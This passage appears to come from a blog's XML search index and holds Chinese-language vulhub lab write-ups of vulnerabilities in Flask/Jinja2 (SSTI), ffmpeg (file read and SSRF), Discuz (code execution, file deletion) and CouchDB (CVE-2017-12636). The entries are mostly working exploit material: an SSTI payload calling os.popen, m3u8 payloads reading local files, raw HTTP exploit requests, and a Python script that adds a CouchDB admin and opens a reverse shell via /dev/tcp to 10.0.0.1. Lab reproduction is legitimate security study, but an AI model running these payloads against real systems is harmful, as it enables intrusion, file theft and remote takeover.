el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask（Jinja2）服务端模板注入漏洞</title>
      <link href="/2019/02/16/flask-jinja2-fu-wu-duan-mo-ban-zhu-ru-lou-dong/"/>
      <url>/2019/02/16/flask-jinja2-fu-wu-duan-mo-ban-zhu-ru-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Flask（Jinja2）-服务端模板注入漏洞"><a href="#Flask（Jinja2）-服务端模板注入漏洞" class="headerlink" title="Flask（Jinja2） 服务端模板注入漏洞"></a>Flask（Jinja2） 服务端模板注入漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></li><li><a href="http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates" target="_blank" rel="noopener">http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates</a></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip/?name=54289</code>，得到54289，说明SSTI漏洞存在。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190613140900.png-water_print" alt=""></p><p>获取eval函数并执行任意python代码的POC：</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__ <span class="token operator">==</span> <span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">}</span>  <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>  <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> b<span class="token punctuation">.</span>__class__ <span class="token operator">==</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__ <span class="token operator">%</span><span class="token punctuation">}</span>    <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token string">'eval'</span> <span class="token keyword">in</span> b<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>      <span class="token punctuation">{</span><span class="token punctuation">{</span> b<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("id").read()'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>  <span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>  <span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span></code></pre><p>访问<code>http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</code>，得到执行结果：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190613140909.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ffmpeg 任意文件读取漏洞</title>
      <link href="/2019/02/15/ffmpeg-ren-yi-wen-jian-du-qu-lou-dong-huan-jing/"/>
      <url>/2019/02/15/ffmpeg-ren-yi-wen-jian-du-qu-lou-dong-huan-jing/</url>
      
        <content type="html"><![CDATA[<h1 id="ffmpeg-任意文件读取漏洞（CVE-2017-9993）"><a href="#ffmpeg-任意文件读取漏洞（CVE-2017-9993）" class="headerlink" title="ffmpeg 任意文件读取漏洞（CVE-2017-9993）"></a>ffmpeg 任意文件读取漏洞（CVE-2017-9993）</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞原理不再赘述，直接下载exp，并生成payload：</p><pre><code># 下载expgit clone https://github.com/neex/ffmpeg-avi-m3u-xbincd ffmpeg-avi-m3u-xbin# 生成payload./gen_xbin_avi.py file:///etc/passwd exp.avi</code></pre><p>生成exp.avi，在<code>http://your-ip:8080/</code>上传。后端将会将你上传的视频用ffmpeg转码后显示，转码时因为ffmpeg的任意文件读取漏洞，可将文件信息读取到视频中：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190611170909.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> ffmpeg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ffmpeg 任意文件读取漏洞/SSRF漏洞</title>
      <link href="/2019/02/15/ffmpeg-ren-yi-wen-jian-du-qu-lou-dong-ssrf-lou-dong/"/>
      <url>/2019/02/15/ffmpeg-ren-yi-wen-jian-du-qu-lou-dong-ssrf-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="ffmpeg-任意文件读取漏洞-SSRF漏洞-（CVE-2016-1897-CVE-2016-1898）"><a href="#ffmpeg-任意文件读取漏洞-SSRF漏洞-（CVE-2016-1897-CVE-2016-1898）" class="headerlink" title="ffmpeg 任意文件读取漏洞/SSRF漏洞 （CVE-2016-1897/CVE-2016-1898）"></a>ffmpeg 任意文件读取漏洞/SSRF漏洞 （CVE-2016-1897/CVE-2016-1898）</h1><p>在FFMpeg2.X 由于在解析HTTP Live Streaming流媒体m3u8文件处理不当，可导致SSRF漏洞与任意文件读取漏洞。当网站允许用户上传多媒体文件，并使用FFMpeg进行处理时会触发该漏洞。</p><p>这个漏洞有两个CVE编号，分别是CVE-2016-1897和CVE-2016-1898，它们两个的区别在于读取文件的行数，CVE-2016-1897只能读取文件的第一行，而CVE-2016-1898可以读取文件任意行，原理基本一样，这里就一起分析了。</p><h2 id="HLS（HTTP-Live-Streaming）"><a href="#HLS（HTTP-Live-Streaming）" class="headerlink" title="HLS（HTTP Live Streaming）"></a>HLS（HTTP Live Streaming）</h2><p>由于漏洞是出现在解析HLS流媒体文件出的问题，所以我们必须先了解HLS。</p><p>HLS（HTTP Live Streaming）是Apple公司开发的一种基于HTTP协议的流媒体通信协议，大多数都应用在PC上和iphone上。它的基本原理是把一个视频流分成很多个很小很小很小的ts流文件，然后通过HTTP下载，每次下载一点点。在一个开始一个新的流媒体会话时，客户端都会先下载一个m3u8（播放列表 Playlist）文件，里面包含了这次HLS会话的所有数据。</p><p><code>http://pl.youku.com/playlist/m3u8?vid=340270152&amp;type=3gphd&amp;ts=1462714824&amp;keyframe=0&amp;ep=dSaSGE6MUssC5ybeiz8bYiXiIiZdXP0O9h2CgdNnAtQnS%2Bm2&amp;sid=746271452251312590fab&amp;token=3319&amp;ctype=12&amp;ev=1&amp;oip=3395898128</code></p><p>这是youku一个视频的m3u8文件，内容如下：</p><blockquote><p>#EXTM3U<br>#EXT-X-TARGETDURATION:6<br>#EXT-X-VERSION:2<br>#EXTINF:6,<br><a href="http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=0&amp;ts_end=5.9&amp;ts_seg_no=0&amp;ts_keyframe=1" target="_blank" rel="noopener">http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=0&amp;ts_end=5.9&amp;ts_seg_no=0&amp;ts_keyframe=1</a><br>#EXTINF:0,<br><a href="http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=5.9&amp;ts_end=6.367&amp;ts_seg_no=1&amp;ts_keyframe=1" target="_blank" rel="noopener">http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=5.9&amp;ts_end=6.367&amp;ts_seg_no=1&amp;ts_keyframe=1</a><br>#EXT-X-ENDLIST</p></blockquote><p>解析：</p><ul><li>#EXTM3U 标签是m3u8的文件头，开头必须要这一行</li><li>#EXT-X-TARGETDURATION 表示整个媒体的长度 这里是6秒</li><li>#EXT-X-VERSION:2 该标签可有可无</li><li>#EXTINF:6, 表示该一段TS流文件的长度</li><li>#EXT-X-ENDLIST 这个相当于文件结束符</li></ul><p>这些是m3u8的最基本的标签，而问题就出在FFMpeg去请求TS流文件的时，由于我们可以伪造一个m3u8文件，FFMpeg不会判断里面的流地址，直接请求。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>SSRF漏洞：<br>直接用FFMpeg解析一个多媒体文件</p><blockquote><p>#EXTM3U<br>#EXT-X-MEDIA-SEQUENCE:0<br>#EXTINF:10.0,<a href="http://192.168.123.100:8080/1.html" target="_blank" rel="noopener">http://192.168.123.100:8080/1.html</a><br>#EXT-X-ENDLIST</p></blockquote><p>（#EXT-X-MEDIA-SEQUENCE或#EXT-X-TARGETDURATION必须存在任意一个，前者是定义ts流文件的序号。去掉会报错：无效文件）</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190611164804.png-water_print" alt=""></p><p><code>ffmpeg -i test.m3u8 test.mp4</code>（也可把m3u8格式改成其他后缀，ffmpeg会自动识别为HLS流文件）</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190611164804.png-water_print" alt=""></p><p>以下几个方式可以读取文件:</p><pre><code>#EXTM3U#EXT-X-TARGETDURATION:1#EXTINF:1,/home/ctf/flag.txt#EXT-X-ENDLIST#EXTM3U#EXT-X-PLAYLIST-TYPE:VOD#EXT-X-TARGETDURATION:1#EXT-X-VERSION:3#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,file:///home/ctf/flag.txt#EXT-X-ENDLIST</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> ffmpeg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</title>
      <link href="/2019/01/10/discuz-quan-ju-bian-liang-fang-yu-rao-guo-dao-zhi-dai-ma-zhi-xing/"/>
      <url>/2019/01/10/discuz-quan-ju-bian-liang-fang-yu-rao-guo-dao-zhi-dai-ma-zhi-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h1><p>由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，我们通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>启动后，访问<a href="http://your-ip:8080/install/" target="_blank" rel="noopener">http://your-ip:8080/install/</a>来安装discuz，数据库地址填写db，数据库名为<code>discuz</code>，数据库账号密码均为<code>root</code>。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();:</code></p><pre class=" language-HTTP"><code class="language-HTTP">GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();Connection: close</code></pre><p>phpinfo已成功执行：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610172241.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Discuz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discuz!X ≤3.4 任意文件删除漏洞</title>
      <link href="/2019/01/10/discuz-x-ren-yi-wen-jian-shan-chu-lou-dong/"/>
      <url>/2019/01/10/discuz-x-ren-yi-wen-jian-shan-chu-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Discuz-X-≤3-4-任意文件删除漏洞"><a href="#Discuz-X-≤3-4-任意文件删除漏洞" class="headerlink" title="Discuz!X ≤3.4 任意文件删除漏洞"></a>Discuz!X ≤3.4 任意文件删除漏洞</h1><p>影响版本：Discuz!X ≤3.4</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>注册用户后，在个人设置页面找到自己的formhash：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610172149.png-water_print" alt=""><br>带上自己的Cookie、formhash发送如下数据包：</p><pre class=" language-HTTP"><code class="language-HTTP">POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1Host: localhostContent-Length: 367Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPFvXyxL45f34L12sUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: [your cookie]Connection: close------WebKitFormBoundaryPFvXyxL45f34L12sContent-Disposition: form-data; name="formhash"[your formhash]------WebKitFormBoundaryPFvXyxL45f34L12sContent-Disposition: form-data; name="birthprovince"../../../robots.txt------WebKitFormBoundaryPFvXyxL45f34L12sContent-Disposition: form-data; name="profilesubmit"1------WebKitFormBoundaryPFvXyxL45f34L12s--</code></pre><p>提交成功之后，用户资料修改页面上的出生地就会显示成下图所示的状态：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610172203.png-water_print" alt=""></p><p>说明我们的脏数据已经进入数据库了。</p><p>然后，新建一个<code>upload.html</code>，代码如下，将其中的<code>[your-ip]</code>改成discuz的域名，<code>[form-hash]</code>改成你的formhash：</p><pre class=" language-HTML"><code class="language-HTML"><body>    <form action="http://[your-ip]/home.php?mod=spacecp&ac=profile&op=base&profilesubmit=1&formhash=[form-hash]" method="post" enctype="multipart/form-data">        <input type="file" name="birthprovince" />        <input type="submit" value="upload" />    </form></body></code></pre><p>用浏览器打开该页面，上传一个正常图片。此时脏数据应该已被提取出，漏洞已经利用结束。</p><p>再次访问<code>http://your-ip/robots.txt</code>，发现文件成功被删除</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Discuz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Couchdb 任意命令执行漏洞</title>
      <link href="/2019/01/09/couchdb-ren-yi-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/01/09/couchdb-ren-yi-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb 任意命令执行漏洞（CVE-2017-12636）</h1><p>CVE-2017-12636是一个任意命令执行漏洞，可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。</p><p>影响版本：小于 1.7.0 以及 小于 2.1.1</p><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>Couchdb 2.x和和1.x的API接口有一定区别，所以这个漏洞的利用方式也不同。本实验环境是1.6.0版本。</p><p>访问<a href="http://your-ip:5984/" target="_blank" rel="noopener">http://your-ip:5984/</a> 即可看到Couchdb的欢迎页面。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171918.png-water_print" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先增加一个管理员用户。</p><h3 id="1-6-0-下的说明"><a href="#1-6-0-下的说明" class="headerlink" title="1.6.0 下的说明"></a>1.6.0 下的说明</h3><pre class=" language-bash"><code class="language-bash">curl -X PUT <span class="token string">'http://vulhub:vulhub@IP:5984/_config/query_servers/cmd'</span> -d <span class="token string">'"id >/tmp/success"'</span>curl -X PUT <span class="token string">'http://vulhub:vulhub@IP:5984/vultest'</span>curl -X PUT <span class="token string">'http://vulhub:vulhub@IP:5984/vultest/vul'</span> -d <span class="token string">'{"_id":"770895a97726d5ca6d70a22173005c7b"}'</span>curl -X POST <span class="token string">'http://vulhub:vulhub@IP:5984/vultest/_temp_view?limit=10'</span> -d <span class="token string">'{"language":"cmd","map":""}'</span> -H <span class="token string">'Content-Type:application/json'</span></code></pre><p>其中,<code>vulhub:vulhub</code>为管理员账号密码。</p><p>第一个请求是添加一个名字为cmd的query_servers，其值为”id &gt;/tmp/success”，这就是我们后面待执行的命令。</p><p>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。</p><p>第四个请求就是在这个Database里进行查询，因为我将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行。</p><h2 id="2-1-0-下的说明"><a href="#2-1-0-下的说明" class="headerlink" title="2.1.0 下的说明"></a>2.1.0 下的说明</h2><p>Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问<code>/_membership</code>即可：</p><p><code>curl http://vulhub:vulhub@your-ip:5984/_membership</code></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171943.png-water_print" alt=""></p><p>可见，只有一个node，名字是<code>nonode@nohost</code>。<br>然后，修改<code>nonode@nohost</code>的配置：</p><pre class=" language-bash"><code class="language-bash">curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d <span class="token string">'"id >/tmp/success"'</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610171954.png-water_print" alt=""></p><p>然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document：</p><pre class=" language-bash"><code class="language-bash">curl -X PUT <span class="token string">'http://vulhub:vulhub@your-ip:5984/vultest'</span>curl -X PUT <span class="token string">'http://vulhub:vulhub@your-ip:5984/vultest/vul'</span> -d <span class="token string">'{"_id":"770895a97726d5ca6d70a22173005c7b"}'</span></code></pre><p>Couchdb 2.x删除了<code>_temp_view</code>，所以为了触发<code>query_servers</code>中定义的命令，需要添加一个<code>_view</code>：</p><pre class=" language-bash"><code class="language-bash">curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d <span class="token string">'{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}'</span> -H <span class="token string">"Content-Type: application/json"</span></code></pre><p>增加<code>_view</code>的同时即触发了<code>query_servers</code>中的命令。</p><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> base64<span class="token keyword">from</span> requests<span class="token punctuation">.</span>auth <span class="token keyword">import</span> HTTPBasicAuthtarget <span class="token operator">=</span> <span class="token string">'http://your-ip:5984'</span>command <span class="token operator">=</span> rb<span class="token triple-quoted-string string">"""sh -i >&amp; /dev/tcp/10.0.0.1/443 0>&amp;1"""</span>version <span class="token operator">=</span> <span class="token number">1</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># session.proxies = {</span><span class="token comment" spellcheck="true">#     'http': 'http://127.0.0.1:8085'</span><span class="token comment" spellcheck="true"># }</span>session<span class="token punctuation">.</span>put<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/_users/org.couchdb.user:wooyun'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token triple-quoted-string string">'''{  "type": "user",  "name": "wooyun",  "roles": ["_admin"],  "roles": [],  "password": "wooyun"}'''</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>auth <span class="token operator">=</span> HTTPBasicAuth<span class="token punctuation">(</span><span class="token string">'wooyun'</span><span class="token punctuation">,</span> <span class="token string">'wooyun'</span><span class="token punctuation">)</span>command <span class="token operator">=</span> <span class="token string">"bash -c '{echo,%s}|{base64,-d}|{bash,-i}'"</span> <span class="token operator">%</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> version <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>put<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'/_config/query_servers/cmd'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/_membership'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'all_nodes'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    session<span class="token punctuation">.</span>put<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/_node/{}/_config/query_servers/cmd'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>put<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/wooyun'</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>put<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/wooyun/test'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">'{"_id": "wooyuntest"}'</span><span class="token punctuation">)</span><span class="token keyword">if</span> version <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/wooyun/_temp_view?limit=10'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">'{"language":"cmd","map":""}'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>put<span class="token punctuation">(</span>target <span class="token operator">+</span> <span class="token string">'/wooyun/_design/test'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">'{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}'</span><span class="token punctuation">)</span></code></pre><p>简单的脚本exp.py，修改其中的target和command为你的测试机器，然后修改version为对应的Couchdb版本（1或2），成功反弹shell：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610172008.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Couchdb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Couchdb 垂直权限绕过漏洞</title>
      <link href="/2019/01/08/couchdb-chui-zhi-quan-xian-rao-guo-lou-dong/"/>
      <url>/2019/01/08/couchdb-chui-zhi-quan-xian-rao-guo-lou-dong/</url>
      
